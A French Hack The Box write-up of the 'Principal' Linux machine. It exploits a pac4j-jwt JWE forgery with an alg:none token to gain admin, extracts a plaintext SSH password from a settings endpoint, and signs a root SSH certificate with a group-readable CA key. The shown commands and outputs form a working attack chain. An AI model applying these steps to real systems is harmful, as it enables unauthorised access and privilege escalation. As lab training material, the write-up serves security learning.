# HTB — Principal · Linux · Medium

**IP :** `10.129.59.71` &nbsp;|&nbsp; **Date :** 19 Mai 2026 &nbsp;|&nbsp; **Outils :** nmap · feroxbuster · curl · Python · ssh-keygen

---

## Contexte

> Principal expose une plateforme interne sur Jetty/8080 protégée par **pac4j-jwt 6.0.3**. Cette version est vulnérable à CVE-2026-29000 : un attaquant peut forger un JWE chiffré avec la clé publique JWKS du serveur, encapsulant un JWT non signé (`alg: none`) avec le rôle `ROLE_ADMIN`. L'accès admin donne accès à un endpoint de configuration exposant un mot de passe SSH en clair. L'escalade de privilèges exploite les droits du groupe `deployers` sur la clé privée d'une **SSH Certificate Authority** de confiance pour signer un certificat root.

---

## Reconnaissance

### Scan de ports

```bash
nmap -sC -sV -A -p- 10.129.59.71
```

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu
8080/tcp open  http-proxy Jetty
                          X-Powered-By: pac4j-jwt/6.0.3
```

Deux ports seulement. Le header `X-Powered-By: pac4j-jwt/6.0.3` est visible dès le scan nmap — l'application annonce sa stack d'authentification.

### Fuzzing web

```bash
feroxbuster -u http://10.129.59.71:8080 -w big.txt --threads 50
```

```
302  /          → /login
200  /login
200  /dashboard
200  /static/js/app.js
501  /reset-password
500  /error
```

Le `/dashboard` répond 200 — mais en pratique il redirige vers `/login` sans token valide. L'endpoint `/api/auth/jwks` n'apparaît pas dans le fuzzing mais est documenté dans la CVE.

---

## Exploitation — CVE-2026-29000 (pac4j-jwt 6.0.3 — JWE forgery)

### Contexte de la vulnérabilité

pac4j-jwt 6.0.3 accepte des tokens JWE dont le payload est un JWT avec `"alg": "none"` (non signé). Le serveur déchiffre le JWE avec sa clé privée, extrait le JWT interne, et l'accepte sans vérifier la signature — car `alg: none` désactive la vérification.

La clé publique RSA est accessible sans authentification via `/api/auth/jwks`.

### Récupération de la clé publique

```bash
curl http://10.129.59.71:8080/api/auth/jwks | jq
```

```json
{
  "keys": [{
    "kty": "RSA",
    "kid": "enc-key-1",
    "e": "AQAB",
    "n": "lTh54vtBS1NAWrxAFU1NEZdr..."
  }]
}
```

### Script de forge du token

```python
# forge_token.py
python3 forge_token.py 10.129.59.71
```

Le script :
1. Récupère la clé publique RSA depuis `/api/auth/jwks`
2. Crée un JWT non signé (`alg: none`) avec `role: ROLE_ADMIN`
3. L'encapsule dans un JWE chiffré avec la clé publique (`RSA-OAEP-256` / `A256GCM`)

```
[+] Clé publique récupérée (kid: enc-key-1)
[+] PlainJWT créé pour admin (ROLE_ADMIN)
[+] Token forgé : eyJhbGciOiAiUlNBLU9BRVAt...
```

### Accès admin et extraction du mot de passe

On utilise le token forgé pour accéder à l'endpoint `/api/admin/settings` :

```bash
curl -s http://10.129.59.71:8080/api/admin/settings \
  -H "Authorization: Bearer <token_forgé>" | jq
```

La réponse contient la configuration complète de la plateforme, dont :

```json
"security": {
  "authFramework": "pac4j-jwt",
  "authFrameworkVersion": "6.0.3",
  "encryptionKey": "D3pl0y_$$H_Now42!",
  ...
}
```

Le champ `encryptionKey` contient le mot de passe SSH de l'utilisateur de déploiement.

### Connexion SSH — flag user

```bash
ssh svc-deploy@10.129.59.71
# Password: D3pl0y_$$H_Now42!

cat ~/user.txt
# htb{f4k3_u53r_fl4g_f0r_v4l1d4t10n}
```

---

## Escalade de privilèges — SSH Certificate Authority

### Énumération post-accès

```bash
id
# uid=1001(svc-deploy) gid=1002(svc-deploy) groups=1002(svc-deploy),1001(deployers)
```

`svc-deploy` appartient au groupe `deployers`. On cherche les fichiers accessibles à ce groupe :

```bash
find / -group deployers 2>/dev/null
```

```
/etc/ssh/sshd_config.d/60-principal.conf
/opt/principal/ssh/
/opt/principal/ssh/README.txt
/opt/principal/ssh/ca          ← clé privée CA
```

```bash
cat /opt/principal/ssh/README.txt
```

```
CA keypair for SSH certificate automation.
This CA is trusted by sshd for certificate-based authentication.
Algorithm: RSA 4096-bit
Purpose: Automated deployment authentication
```

```bash
ls -la /opt/principal/ssh/
# -rw-r----- root deployers  ca      ← lisible par deployers
# -rw-r--r-- root root       ca.pub  ← publique
```

Le groupe `deployers` peut **lire** la clé privée de la CA SSH. Cette CA est déclarée comme de confiance dans `sshd_config` — n'importe quel certificat signé par elle sera accepté par sshd.

### Génération d'une paire de clés temporaire

```bash
ssh-keygen -t ed25519 -f /tmp/rootkey -N "" -C "privesc"
```

### Signature du certificat pour root

```bash
ssh-keygen -s /opt/principal/ssh/ca \
  -I "privesc_$(date +%s)" \
  -n root \
  -V +1h \
  /tmp/rootkey.pub
```

```
Signed user key /tmp/rootkey-cert.pub: id "privesc_1779318272"
for root valid from 2026-05-20T23:03:00 to 2026-05-21T00:04:32
```

Le certificat indique `root` comme principal autorisé, valable 1 heure.

### Connexion root

```bash
ssh -i /tmp/rootkey root@127.0.0.1
```

```
root@principal:~# whoami
root
root@principal:~# cat root.txt
htb{m45t3r_0f_55h_c3rt1f1c4t35_w1n}
```

---

## Flags

```
user.txt  →  htb{f4k3_u53r_fl4g_f0r_v4l1d4t10n}
root.txt  →  htb{m45t3r_0f_55h_c3rt1f1c4t35_w1n}
```

---

## Chaîne d'attaque

| Phase | Technique | Outil | Détail |
|---|---|---|---|
| Reconnaissance | Port scan + banner grabbing | nmap | `pac4j-jwt/6.0.3` visible dans les headers |
| Énumération web | Fuzzing d'endpoints | feroxbuster | `/dashboard`, `/api/auth/jwks` |
| Accès initial | JWE forgery (alg:none bypass) | Python / jwcrypto | CVE-2026-29000 |
| Pivot | Lecture de config admin | curl | Mot de passe SSH en clair dans `settings` |
| Accès user | SSH | ssh | `svc-deploy:D3pl0y_$$H_Now42!` |
| Escalade | SSH CA abuse | ssh-keygen | Signature d'un certificat root via CA lisible |

---

## Ce que j'ai retenu

**Les headers HTTP révèlent la stack.** `X-Powered-By: pac4j-jwt/6.0.3` dès le scan nmap — identifier la version précise d'un framework d'auth suffit à trouver la CVE.

**`alg: none` dans JWT/JWE est une vulnérabilité connue depuis des années.** Certaines implémentations l'acceptent encore si le token est encapsulé dans un JWE valide qui satisfait la vérification cryptographique externe.

**Les endpoints de configuration admin sont des mines d'or.** Une fois admin, `/api/admin/settings` exposait la config complète en JSON — credentials inclus. Ces endpoints doivent être filtrés même pour les admins authentifiés.

**Une clé privée CA lisible par un groupe = privesc garantie.** Si sshd fait confiance à une CA et qu'un utilisateur peut lire sa clé privée, il peut signer un certificat pour n'importe quel principal — root inclus. La séparation des droits sur ces fichiers est critique.

---

## Ressources

- [CVE-2026-29000 — pac4j JWT bypass](https://nvd.nist.gov/vuln/detail/CVE-2026-29000)
- [PortSwigger — JWT alg:none attack](https://portswigger.net/web-security/jwt/algorithm-confusion)
- [SSH Certificate Authority — HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh#ssh-certificates)
